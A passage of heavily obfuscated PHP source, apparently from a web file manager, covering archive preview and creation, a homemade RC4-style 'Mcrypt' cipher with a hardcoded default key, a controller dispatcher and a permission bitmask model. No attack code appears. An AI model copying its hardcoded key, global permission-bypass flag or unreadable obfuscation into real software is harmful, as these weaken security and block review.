md5($FÜôàƒúÉ≠ . $A™™πàÌÏ⁄); if ($F¢ÿ˜œÀÔû) { $EêÃ«ÍÁÕô = $F©Ç‰óÖÂË . $F¢ÿ˜œÀÔû; } goto Bæüï´ÀÃÃ; F”—ΩáŒ¡ï: } static function filePreview($F”¿¬Æ™®ß, $BÖ—Çéé≥∆, $f•œ∏√“íŸ = false, $B‡¬ß•≈Ñ‹ = false) { goto D™Ù≈±Ø≤ö; BâÒé≠õŒÜ: if (!$AúÀﬁ≤ˆƒ[$a∂Ñıéó•∑[1036]]) { show_json($AúÀﬁ≤ˆƒ[$a∂Ñıéó•∑[1038]], !1); } if (!file_exists($c’‹—¡√∂†)) { show_json($a∂Ñıéó•∑[1929], !1); } @rename($c’‹—¡√∂†, $dèëçﬁÿÖ—); goto B∞≥åºãéÏ; D™Ù≈±Ø≤ö: $a∂Ñıéó•∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); $F‹ù´Ìö∆ë = TEMP_FILES . hash_path($F”¿¬Æ™®ß) . $a∂Ñıéó•∑[8]; goto EÖñÕû—ƒÈ; EÖñÕû—ƒÈ: mk_dir($F‹ù´Ìö∆ë); $dèëçﬁÿÖ— = $F‹ù´Ìö∆ë . md5($F”¿¬Æ™®ß . $BÖ—Çéé≥∆ . $B‡¬ß•≈Ñ‹); $d¬‡⁄éìÊ¬ = $a∂Ñıéó•∑[33]; goto dô√à ™ıΩ; B∞≥åºãéÏ: if (!file_exists($dèëçﬁÿÖ—)) { del_dir($F‹ù´Ìö∆ë); show_json($a∂Ñıéó•∑[1930]); } IO::fileOut($dèëçﬁÿÖ—, $f•œ∏√“íŸ, $f£ÕÈÂãÑ«); goto fŒ¡úÌ‚˜ï; dô√à ™ıΩ: $AúÀﬁ≤ˆƒ = self::extract($F”¿¬Æ™®ß, $F‹ù´Ìö∆ë, $BÖ—Çéé≥∆, $d¬‡⁄éìÊ¬); if (is_array($d¬‡⁄éìÊ¬)) { show_json($a∂Ñıéó•∑[1928], !1); } if (file_exists($dèëçﬁÿÖ—)) { IO::fileOut($dèëçﬁÿÖ—, $f•œ∏√“íŸ, get_path_this($d¬‡⁄éìÊ¬)); return; } goto EÖ∏åãèÈß; EÖ∏åãèÈß: $d¬‡⁄éìÊ¬ = unzip_pre_name($d¬‡⁄éìÊ¬); $f£ÕÈÂãÑ« = get_path_this($d¬‡⁄éìÊ¬); $c’‹—¡√∂† = unzip_filter_ext($F‹ù´Ìö∆ë . $f£ÕÈÂãÑ«); goto BâÒé≠õŒÜ; fŒ¡úÌ‚˜ï: } static function create($a¥£≥ÁÙÕ∫, $D∫äø‘ ”º) { $FÆÌ”–µ¶Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; self::init(); $cá›Ì›øºó = get_path_ext($a¥£≥ÁÙÕ∫); $fÇã…±≤¿ = !1; if (self::checkIfType($cá›Ì›øºó, $FÆÌ”–µ¶Í[301])) { if (kodZipArchive::support($FÆÌ”–µ¶Í[1015])) { return kodZipArchive::create($a¥£≥ÁÙÕ∫, $D∫äø‘ ”º); } $bÖòÁ∫¡»  = new PclZip($a¥£≥ÁÙÕ∫); foreach ($D∫äø‘ ”º as $b≤¶≥»ÇÚΩ => $EÒâÕ§“ÑÇ) { $EÒâÕ§“ÑÇ = str_replace($FÆÌ”–µ¶Í[467], $FÆÌ”–µ¶Í[8], $EÒâÕ§“ÑÇ); $CÈã§ì£«— = Kodio::clear(get_path_father($EÒâÕ§“ÑÇ)); if ($b≤¶≥»ÇÚΩ == 0) { $fÇã…±≤¿ = $bÖòÁ∫¡» ->create($EÒâÕ§“ÑÇ, PCLZIP_OPT_REMOVE_PATH, $CÈã§ì£«—, PCLZIP_CB_PRE_FILE_NAME, $FÆÌ”–µ¶Í[1931]); continue; } $fÇã…±≤¿ = $bÖòÁ∫¡» ->add($EÒâÕ§“ÑÇ, PCLZIP_OPT_REMOVE_PATH, $CÈã§ì£«—, PCLZIP_CB_PRE_FILE_NAME, $FÆÌ”–µ¶Í[1931]); } } else { if (self::checkIfType($cá›Ì›øºó, $FÆÌ”–µ¶Í[1902])) { foreach ($D∫äø‘ ”º as $b≤¶≥»ÇÚΩ => $EÒâÕ§“ÑÇ) { $EÒâÕ§“ÑÇ = str_replace($FÆÌ”–µ¶Í[467], $FÆÌ”–µ¶Í[8], $EÒâÕ§“ÑÇ); $CÈã§ì£«— = Kodio::clear(get_path_father($EÒâÕ§“ÑÇ)); if ($b≤¶≥»ÇÚΩ == 0) { $fÇã…±≤¿ = PclTarCreate($a¥£≥ÁÙÕ∫, array($EÒâÕ§“ÑÇ), $cá›Ì›øºó, null, $CÈã§ì£«—); continue; } $fÇã…±≤¿ = PclTarAddList($a¥£≥ÁÙÕ∫, array($EÒâÕ§“ÑÇ), $FÆÌ”–µ¶Í[33], $CÈã§ì£«—, $cá›Ì›øºó); } } } return $fÇã…±≤¿; } } class Mcrypt { public static $defaultKey = "\141\x21\164\141\x6b\x41\72\x64\154\155\143\154\144\105\x76\54\x65"; public static function encode($dò∫≈Ñ∏ßª, $EÁùŸäñÑµ = '', $C•ı∫ÜÜ√√ = 0, $fìπ∆∏ç”Œ = '') { goto cØ‰ÜÛÍ•ﬁ; aè»Ó√•ù: $A¶Ì≥¥Èƒ› = substr($fìπ∆∏ç”Œ, -$dÙü–‰üüÇ); $d»ô˘ù∂®√ = $Cæ—Ç„»ÿÎ . md5($Cæ—Ç„»ÿÎ . $A¶Ì≥¥Èƒ›); $F‹∂∞„¶õ» = strlen($d»ô˘ù∂®√); goto CØæÌÛ⁄àÇ; f∫÷Ï¥ö¥ã: $fØ‘ÇÓüÿå = str_replace(array($aÇˆè¯£ß…[284], $aÇˆè¯£ß…[8], $aÇˆè¯£ß…[911]), array($aÇˆè¯£ß…[412], $aÇˆè¯£ß…[70], $aÇˆè¯£ß…[91]), $fØ‘ÇÓüÿå); return $fØ‘ÇÓüÿå; goto dÜ≥¡°–¡à; C¥⁄‰“˘Á˜: $fØ‘ÇÓüÿå = $aÇˆè¯£ß…[33]; for ($B¥¶ÎÖ÷Ç· = $dåŒé±é»° = $eË¥Ú›ÕÔä = 0; $eË¥Ú›ÕÔä < $AµÂ©Çõ‚ñ; $eË¥Ú›ÕÔä++) { $B¥¶ÎÖ÷Ç· = ($B¥¶ÎÖ÷Ç· + 1) % 256; $dåŒé±é»° = ($dåŒé±é»° + $Eï∆ëÂ¯ô√[$B¥¶ÎÖ÷Ç·]) % 256; $FÿÉ”à…Ñä = $Eï∆ëÂ¯ô√[$B¥¶ÎÖ÷Ç·]; $Eï∆ëÂ¯ô√[$B¥¶ÎÖ÷Ç·] = $Eï∆ëÂ¯ô√[$dåŒé±é»°]; $Eï∆ëÂ¯ô√[$dåŒé±é»°] = $FÿÉ”à…Ñä; $fØ‘ÇÓüÿå .= chr(ord($dò∫≈Ñ∏ßª[$eË¥Ú›ÕÔä]) ^ $Eï∆ëÂ¯ô√[($Eï∆ëÂ¯ô√[$B¥¶ÎÖ÷Ç·] + $Eï∆ëÂ¯ô√[$dåŒé±é»°]) % 256]); } $fØ‘ÇÓüÿå = $A¶Ì≥¥Èƒ› . str_replace($aÇˆè¯£ß…[911], $aÇˆè¯£ß…[33], base64_encode($fØ‘ÇÓüÿå)); goto f∫÷Ï¥ö¥ã; EçŸƒê·√ã: $Cæ—Ç„»ÿÎ = md5(substr($EÁùŸäñÑµ, 0, 16)); $Cˆ»◊⁄ÃÏû = md5(substr($EÁùŸäñÑµ, 16, 16)); $fìπ∆∏ç”Œ = $fìπ∆∏ç”Œ ? $fìπ∆∏ç”Œ : md5(microtime()); goto aè»Ó√•ù; cØ‰ÜÛÍ•ﬁ: $aÇˆè¯£ß… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÙü–‰üüÇ = 4; $EÁùŸäñÑµ = md5($EÁùŸäñÑµ ? $EÁùŸäñÑµ : self::$defaultKey); goto EçŸƒê·√ã; Dàä‚Õƒ¥é: for ($eË¥Ú›ÕÔä = 0; $eË¥Ú›ÕÔä <= 255; $eË¥Ú›ÕÔä++) { $eï–Ÿ• πÓ[$eË¥Ú›ÕÔä] = ord($d»ô˘ù∂®√[$eË¥Ú›ÕÔä % $F‹∂∞„¶õ»]); } $Eï∆ëÂ¯ô√ = range(0, 255); for ($dåŒé±é»° = $eË¥Ú›ÕÔä = 0; $eË¥Ú›ÕÔä < 256; $eË¥Ú›ÕÔä++) { $dåŒé±é»° = ($dåŒé±é»° + $Eï∆ëÂ¯ô√[$eË¥Ú›ÕÔä] + $eï–Ÿ• πÓ[$eË¥Ú›ÕÔä]) % 256; $FÿÉ”à…Ñä = $Eï∆ëÂ¯ô√[$eË¥Ú›ÕÔä]; $Eï∆ëÂ¯ô√[$eË¥Ú›ÕÔä] = $Eï∆ëÂ¯ô√[$dåŒé±é»°]; $Eï∆ëÂ¯ô√[$dåŒé±é»°] = $FÿÉ”à…Ñä; } goto C¥⁄‰“˘Á˜; CØæÌÛ⁄àÇ: $dò∫≈Ñ∏ßª = sprintf($aÇˆè¯£ß…[1932], $C•ı∫ÜÜ√√ ? $C•ı∫ÜÜ√√ + time() : 0) . substr(md5($dò∫≈Ñ∏ßª . $Cˆ»◊⁄ÃÏû), 0, 16) . $dò∫≈Ñ∏ßª; $AµÂ©Çõ‚ñ = strlen($dò∫≈Ñ∏ßª); $eï–Ÿ• πÓ = array(); goto Dàä‚Õƒ¥é; dÜ≥¡°–¡à: } public static function decode($Bè√±óÑÚ¯, $CÚ†Âõ∫°Ü = '') { goto BΩÙµ≥‹ﬁ•; C¨◊µ÷Ë±¯: for ($Fìù—≠ûâ¥ = 0; $Fìù—≠ûâ¥ <= 255; $Fìù—≠ûâ¥++) { $a£œ–Ÿ˘ ˆ[$Fìù—≠ûâ¥] = ord($c≠—≤≠ÃÉõ[$Fìù—≠ûâ¥ % $Fîè¡Û™≥π]); } $cœ£ëö¡≤¯ = range(0, 255); for ($dì»∂Àé‰Û = $Fìù—≠ûâ¥ = 0; $Fìù—≠ûâ¥ < 256; $Fìù—≠ûâ¥++) { $dì»∂Àé‰Û = ($dì»∂Àé‰Û + $cœ£ëö¡≤¯[$Fìù—≠ûâ¥] + $a£œ–Ÿ˘ ˆ[$Fìù—≠ûâ¥]) % 256; $dëºÔŒûßÕ = $cœ£ëö¡≤¯[$Fìù—≠ûâ¥]; $cœ£ëö¡≤¯[$Fìù—≠ûâ¥] = $cœ£ëö¡≤¯[$dì»∂Àé‰Û]; $cœ£ëö¡≤¯[$dì»∂Àé‰Û] = $dëºÔŒûßÕ; } goto dÂï∆Èä¡Ç; A˜Ç«£†’∫: $Bè√±óÑÚ¯ = base64_decode(substr($Bè√±óÑÚ¯, $e–É”∏öª√)); $DÜûË‡¢≠« = strlen($Bè√±óÑÚ¯); $a£œ–Ÿ˘ ˆ = array(); goto C¨◊µ÷Ë±¯; Fççèﬁºπõ: if (($E«ÇêŸ®ø == 0 || $E«ÇêŸ®ø - time() > 0) && substr($D›öë√è∫Ë, 10, 16) == substr(md5(substr($D›öë√è∫Ë, 26) . $dÓå≠Ñ°≤Â), 0, 16)) { return substr($D›öë√è∫Ë, 26); } else { return $d›Î‰≈”®˘[33]; } goto açêî∞ÒüÕ; eÜ¬ïö©Ω: $d‘úø÷Ÿ⁄î = substr($Bè√±óÑÚ¯, 0, $e–É”∏öª√); $c≠—≤≠ÃÉõ = $dÿçñ∫ôÁË . md5($dÿçñ∫ôÁË . $d‘úø÷Ÿ⁄î); $Fîè¡Û™≥π = strlen($c≠—≤≠ÃÉõ); goto A˜Ç«£†’∫; dÂï∆Èä¡Ç: $D›öë√è∫Ë = $d›Î‰≈”®˘[33]; for ($eõêà‹Ô”¨ = $dì»∂Àé‰Û = $Fìù—≠ûâ¥ = 0; $Fìù—≠ûâ¥ < $DÜûË‡¢≠«; $Fìù—≠ûâ¥++) { $eõêà‹Ô”¨ = ($eõêà‹Ô”¨ + 1) % 256; $dì»∂Àé‰Û = ($dì»∂Àé‰Û + $cœ£ëö¡≤¯[$eõêà‹Ô”¨]) % 256; $dëºÔŒûßÕ = $cœ£ëö¡≤¯[$eõêà‹Ô”¨]; $cœ£ëö¡≤¯[$eõêà‹Ô”¨] = $cœ£ëö¡≤¯[$dì»∂Àé‰Û]; $cœ£ëö¡≤¯[$dì»∂Àé‰Û] = $dëºÔŒûßÕ; $D›öë√è∫Ë .= chr(ord($Bè√±óÑÚ¯[$Fìù—≠ûâ¥]) ^ $cœ£ëö¡≤¯[($cœ£ëö¡≤¯[$eõêà‹Ô”¨] + $cœ£ëö¡≤¯[$dì»∂Àé‰Û]) % 256]); } $E«ÇêŸ®ø = intval(substr($D›öë√è∫Ë, 0, 10)); goto Fççèﬁºπõ; BΩÙµ≥‹ﬁ•: $d›Î‰≈”®˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bè√±óÑÚ¯ = str_replace(array($d›Î‰≈”®˘[412], $d›Î‰≈”®˘[70], $d›Î‰≈”®˘[91]), array($d›Î‰≈”®˘[284], $d›Î‰≈”®˘[8], $d›Î‰≈”®˘[911]), $Bè√±óÑÚ¯); $e–É”∏öª√ = 4; goto D¿ä—÷∂Ø∂; D¿ä—÷∂Ø∂: $CÚ†Âõ∫°Ü = md5($CÚ†Âõ∫°Ü ? $CÚ†Âõ∫°Ü : self::$defaultKey); $dÿçñ∫ôÁË = md5(substr($CÚ†Âõ∫°Ü, 0, 16)); $dÓå≠Ñ°≤Â = md5(substr($CÚ†Âõ∫°Ü, 16, 16)); goto eÜ¬ïö©Ω; açêî∞ÒüÕ: } } define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1933], 1); goto a◊ÆáÜ±ëü; CÑ§ñÁÙ∂à: function Action($fﬁÜ·ﬁöô® = '') { goto aå—±†…∫ê; aå—±†…∫ê: $bª÷Çèíì› =& $_SERVER[ÁŸäœ¨]; static $D´¿ûÁ∞‰ã = array(); $bÂΩÚ›Òãç = $fﬁÜ·ﬁöô®; goto b ÙÀ•“‘Û; aáÂÖºÁéË: $D´¿ûÁ∞‰ã[$aâ√®«‘ä…] = new $EÜëû†Ç‡∞(); $D´¿ûÁ∞‰ã[$bÂΩÚ›Òãç] = $D´¿ûÁ∞‰ã[$aâ√®«‘ä…]; return $D´¿ûÁ∞‰ã[$aâ√®«‘ä…]; goto c‰◊ÚıãøÇ; fä¯ƒ¶ö±¥: if (isset($D´¿ûÁ∞‰ã[$aâ√®«‘ä…])) { return $D´¿ûÁ∞‰ã[$aâ√®«‘ä…]; } if (is_file($aù‰¡˜¶≥Ö)) { include_once $aù‰¡˜¶≥Ö; } if (!class_exists($EÜëû†Ç‡∞)) { return actionCallError("\x5b{$fﬁÜ·ﬁöô®}\x20\75\x3e\x20{$EÜëû†Ç‡∞}\x5d\40\143\154\x61\x73\163\40\156\x6f\164\40\x65\170\151\163\164\163\41"); } goto aáÂÖºÁéË; b ÙÀ•“‘Û: if (isset($D´¿ûÁ∞‰ã[$bÂΩÚ›Òãç])) { return $D´¿ûÁ∞‰ã[$bÂΩÚ›Òãç]; } $fﬁÜ·ﬁöô® = trim(str_replace($bª÷Çèíì›[4], $bª÷Çèíì›[5], $fﬁÜ·ﬁöô®), $bª÷Çèíì›[4]); $A›Öπ¿«ÂÖ = explode($bª÷Çèíì›[5], $fﬁÜ·ﬁöô®); goto dù´∂Ø…çä; dù´∂Ø…çä: $dÂâ‘ ≈÷• = strtolower($A›Öπ¿«ÂÖ[0]); if (substr($dÂâ‘ ≈÷•, -6) == $bª÷Çèíì›[6]) { $fﬁÜ·ﬁöô® = substr($A›Öπ¿«ÂÖ[0], 0, -6); $EÜëû†Ç‡∞ = $fﬁÜ·ﬁöô® . $bª÷Çèíì›[7]; $aù‰¡˜¶≥Ö = $bª÷Çèíì›[8]; if (isset($A›Öπ¿«ÂÖ[1]) && substr(strtolower($A›Öπ¿«ÂÖ[1]), -5) == $bª÷Çèíì›[9]) { $EÜëû†Ç‡∞ = $fﬁÜ·ﬁöô® . $A›Öπ¿«ÂÖ[1]; $aù‰¡˜¶≥Ö = $bª÷Çèíì›[10] . $A›Öπ¿«ÂÖ[1] . $bª÷Çèíì›[11]; } else { if (count($A›Öπ¿«ÂÖ) == 3) { $EÜëû†Ç‡∞ = $fﬁÜ·ﬁöô® . $A›Öπ¿«ÂÖ[1] . $A›Öπ¿«ÂÖ[2]; $aù‰¡˜¶≥Ö = $bª÷Çèíì›[12] . $A›Öπ¿«ÂÖ[1] . $bª÷Çèíì›[13] . $A›Öπ¿«ÂÖ[2] . $bª÷Çèíì›[11]; } } $aù‰¡˜¶≥Ö = PLUGIN_DIR . $fﬁÜ·ﬁöô® . $bª÷Çèíì›[4] . $aù‰¡˜¶≥Ö; } else { if (substr($dÂâ‘ ≈÷•, -5) == $bª÷Çèíì›[9]) { $fﬁÜ·ﬁöô® = substr($A›Öπ¿«ÂÖ[0], 0, -5); return Model($fﬁÜ·ﬁöô®); } else { $EÜëû†Ç‡∞ = $A›Öπ¿«ÂÖ[0] . $A›Öπ¿«ÂÖ[1]; $aù‰¡˜¶≥Ö = CONTROLLER_DIR . $A›Öπ¿«ÂÖ[0] . $bª÷Çèíì›[4] . $A›Öπ¿«ÂÖ[1] . $bª÷Çèíì›[14]; } } $aâ√®«‘ä… = strtolower($EÜëû†Ç‡∞); goto fä¯ƒ¶ö±¥; c‰◊ÚıãøÇ: } function ActionApply($AÜÇ√àÆë, $e’≠Ø”öç‰ = array()) { goto d¿¬§◊∫»«; c◊ú±„„≠∆: if (!method_exists($C∑ÓË¨‹ó”, $eÇÂÖΩ≠öÇ)) { return actionCallError("{$AÜÇ√àÆë}\x20\155\x65\164\150\x6f\144\x20\x6e\157\x74\40\x65\170\151\163\x74\163\x21"); } $aŒôˆ∂⁄ò‘ = call_user_func_array(array($C∑ÓË¨‹ó”, $eÇÂÖΩ≠öÇ), $e’≠Ø”öç‰); return $aŒôˆ∂⁄ò‘; goto F∆ééœ˜ªñ; b·¡›Ë°©‰: $A›ﬂ¢˘ÆŸê = substr($AÜÇ√àÆë, 0, $fâÈæ—Œíà); $eÇÂÖΩ≠öÇ = substr($AÜÇ√àÆë, $fâÈæ—Œíà + 1); $C∑ÓË¨‹ó” = Action($A›ﬂ¢˘ÆŸê); goto c◊ú±„„≠∆; d¿¬§◊∫»«: if (is_array($AÜÇ√àÆë)) { return call_user_func_array($AÜÇ√àÆë, $e’≠Ø”öç‰); } if (function_exists($AÜÇ√àÆë)) { return call_user_func_array($AÜÇ√àÆë, $e’≠Ø”öç‰); } $fâÈæ—Œíà = strrpos($AÜÇ√àÆë, $_SERVER[ÁŸäœ¨][5]); goto b·¡›Ë°©‰; F∆ééœ˜ªñ: } function actionCallError($eıÑﬁÛ≠Ú⁄) { $cÎå÷Òë¨œ =& $_SERVER[ÁŸäœ¨]; $f¡î∏©ôì  = json_encode_force(array($cÎå÷Òë¨œ[15] => this_url(), $cÎå÷Òë¨œ[16] => $GLOBALS[$cÎå÷Òë¨œ[16]])); $f¡î∏©ôì  = str_replace(array($cÎå÷Òë¨œ[17]), array($cÎå÷Òë¨œ[4]), $f¡î∏©ôì ); return write_log($eıÑﬁÛ≠Ú⁄ . $cÎå÷Òë¨œ[18] . $f¡î∏©ôì , $cÎå÷Òë¨œ[19]); } goto b†™í•¢∆ö; BßÏÎ™™˜ƒ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $C›ºõ»‡Ç„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c∞å›ò€ãô = array(array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2107]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2109], $C›ºõ»‡Ç„[2110] => 6, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2113]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2114], $C›ºõ»‡Ç„[2110] => 1, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2115]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2116], $C›ºõ»‡Ç„[2110] => 2, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2117]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2116], $C›ºõ»‡Ç„[2110] => 3, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2118]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2119], $C›ºõ»‡Ç„[2110] => 4, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => self::AUTH_SHOW | self::AUTH_VIEW), array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2120]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2121], $C›ºõ»‡Ç„[2110] => 5, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($C›ºõ»‡Ç„[386] => LNG($C›ºõ»‡Ç„[2122]), $C›ºõ»‡Ç„[2108] => $C›ºõ»‡Ç„[2123], $C›ºõ»‡Ç„[2110] => 7, $C›ºõ»‡Ç„[2111] => 1, $C›ºõ»‡Ç„[2112] => 0)); return $c∞å›ò€ãô; } public static function authCheck($fŸÎ◊©≈æ‰, $Bì≠âö∫ÿà) { $fŸÎ◊©≈æ‰ = intval($fŸÎ◊©≈æ‰); if (_get($GLOBALS, $_SERVER[Ä¿¡‡öóµŸﬂ‡][457])) { return !0; } if ($fŸÎ◊©≈æ‰ <= 0) { return !1; } if (($fŸÎ◊©≈æ‰ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fŸÎ◊©≈æ‰ & $Bì≠âö∫ÿà); } public static function authCheckShow($cò°ﬁÖú–Œ) { return self::authCheck($cò°ﬁÖú–Œ, self::AUTH_SHOW); } public static function authCheckView($aÎóìÇ™∆√) { return self::authCheck($aÎóìÇ™∆√, self::AUTH_VIEW); } public static function authCheckDownload($B’íÑ‡ÿöå) { return self::authCheck($B’íÑ‡ÿöå, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Cõ—ë†´…ﬁ) { return self::authCheck($Cõ—ë†´…ﬁ, self::AUTH_UPLOAD); } public static function authCheckEdit($BÙÇ’Çùﬂ¯) { return self::authCheck($BÙÇ’Çùﬂ¯, self::AUTH_EDIT); } public static function authCheckRemove($cÀÑŸçºŒß) { return self::authCheck($cÀÑŸçºŒß, self::AUTH_REMOVE); } public static function authCheckShare($a∞àÀàæøâ) { return self::authCheck($a∞àÀàæøâ, self::AUTH_SHARE); } public static function authCheckComment($e˘† ı—Ωª) { return self::authCheck($e˘† ı—Ωª, self::AUTH_COMMENT); } public static function authCheckEvent($BÒäÿ¿æÌ≤) { return self::authCheck($BÒäÿ¿æÌ≤, self::AUTH_EVENT); } public static function authCheckRoot($eåáé†’êª) { return self::authCheck($eåáé†’êª, self::AUTH_ROOT); } public static function authDisable($CÖ√®¡—∫á, $D√ä‚£˘Ö–) { if (intval($CÖ√®¡—∫á) <= 0) { return 0; } return intval($CÖ√®¡—∫á) & ~$D√ä‚£˘Ö–; } public $optionType = "\x53\171\x73\164\x65\155\56\163\x6f\165\x72\143\145\101\165\164\x68\114\151\x73\164"; public $field = array("\156\141\155\145", "\x61\x75\x74\150", "\x6c\141\142\x65\154", "\x64\151\x73\160\154\x61\x79", "\x73\171\163\x74\x65\x6d", "\163\x6f\x72\164"); public function initData() { $EªÃïéåöÎ = $this->authDefault(); foreach ($EªÃïéåöÎ as $céÛâÓ™ôœ) { $this->add($céÛâÓ™ôœ); } } public function listData($aÔçóÃí»ª = false, $CÑ˜êÍêÀˆ = "\163\157\x72\164", $e◊˘‚≥§í® = false) { return parent::listData($aÔçóÃí»ª, $CÑ˜êÍêÀˆ, $e◊˘‚≥§í®); } public function update($FòÔ…Ç÷≈Ê, $eÁ·…’‡ßö) { $b⁄‹©©ﬁﬂô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Aº÷⁄∞Úƒ° = parent::listData($FòÔ…Ç÷≈Ê); $AÛ∞’òé„… = $this->findByName($eÁ·…’‡ßö[$b⁄‹©©ﬁﬂô[28]]); if (!$Aº÷⁄∞Úƒ° || $AÛ∞’òé„… && $AÛ∞’òé„…[$b⁄‹©©ﬁﬂô[367]] != $Aº÷⁄∞Úƒ°[$b⁄‹©©ﬁﬂô[367]]) { return !1; } $this->filterAuth($eÁ·…’‡ßö[$b⁄‹©©ﬁﬂô[376]]); return parent::update($FòÔ…Ç÷≈Ê, $eÁ·…’‡ßö); } public function remove($D„É◊≥Ç©É) { $CØí˘óó‘· = parent::listData($D„É◊≥Ç©É); if (!$CØí˘óó‘· || $CØí˘óó‘·[$_SERVER[Ä¿¡‡öóµŸﬂ‡][1084]]) { return !1; } return parent::remove($D„É◊≥Ç©É); } public function add($aË∆–®ÁóÔ = array()) { goto fÉ≥ñ°˜”ê; EÑçÇ·Áë¬: $aË∆–®ÁóÔ = array_merge($b‰ÿâŒíÿÕ, $aË∆–®ÁóÔ); $aË∆–®ÁóÔ[$DΩÀüÌÔóå[2127]] = $this->getSort(); $this->filterAuth($aË∆–®ÁóÔ[$DΩÀüÌÔóå[376]]); goto Bÿã≠ÏƒÒÚ; fÉ≥ñ°˜”ê: $DΩÀüÌÔóå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->findByName($aË∆–®ÁóÔ[$DΩÀüÌÔóå[28]])) { return !1; } $b‰ÿâŒíÿÕ = array($DΩÀüÌÔóå[28] => $DΩÀüÌÔóå[33], $DΩÀüÌÔóå[376] => 1, $DΩÀüÌÔóå[2124] => $DΩÀüÌÔóå[2125], $DΩÀüÌÔóå[2126] => 1, $DΩÀüÌÔóå[1084] => 0, $DΩÀüÌÔóå[2127] => 0); goto EÑçÇ·Áë¬; Bÿã≠ÏƒÒÚ: return parent::insert($aË∆–®ÁóÔ); goto Aˆ…∂ôÿ¿É; Aˆ…∂ôÿ¿É: } private function getSort() { $EÌúÑ¡øåÏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f¬•øüõæÈ = parent::listData(); $d†¶¥õóñÿ = array_to_keyvalue($f¬•øüõæÈ, $EÌúÑ¡øåÏ[33], $EÌúÑ¡øåÏ[2127]); return empty($d†¶¥õóñÿ) ? 0 : max($d†¶¥õóñÿ) + 1; } private function filterAuth(&$c“‰Øà√ı®) { goto Cê¬Õ±≠÷ó; Cê¬Õ±≠÷ó: if (!$c“‰Øà√ı®) { return; } $EÎ¨ ≈®ÚÉ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EóŸØﬁ€ë = array(); goto EÒ’£ÉæÔú; EÒ’£ÉæÔú: foreach ($EÎ¨ ≈®ÚÉ as $CçÒˆúÒÀâ) { if ($c“‰Øà√ı® & $CçÒˆúÒÀâ) { $EóŸØﬁ€ë[] = $CçÒˆúÒÀâ; } } if (in_array(self::AUTH_ROOT, $EóŸØﬁ€ë)) { $c“‰Øà√ı® = array_sum($EÎ¨ ≈®ÚÉ); return; } $e˜±Êéèº÷ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bÜÛÕÍÏ˘Ã; bÜÛÕÍÏ˘Ã: foreach ($EóŸØﬁ€ë as $CçÒˆúÒÀâ) { if (isset($e˜±Êéèº÷[$CçÒˆúÒÀâ])) { $EóŸØﬁ€ë = array_merge($EóŸØﬁ€ë, $e˜±Êéèº÷[$CçÒˆúÒÀâ]); } } $EóŸØﬁ€ë[] = self::AUTH_SHOW; $c“‰Øà√ı® = array_sum(array_unique($EóŸØﬁ€ë)); goto Aè∫¿ê≤»«; Aè∫¿ê≤»«: } public function sort($f“ã‰¯‹éê, $aûÔÁ®áù) { return parent::update($f“ã‰¯‹éê, $aûÔÁ®áù); } } if 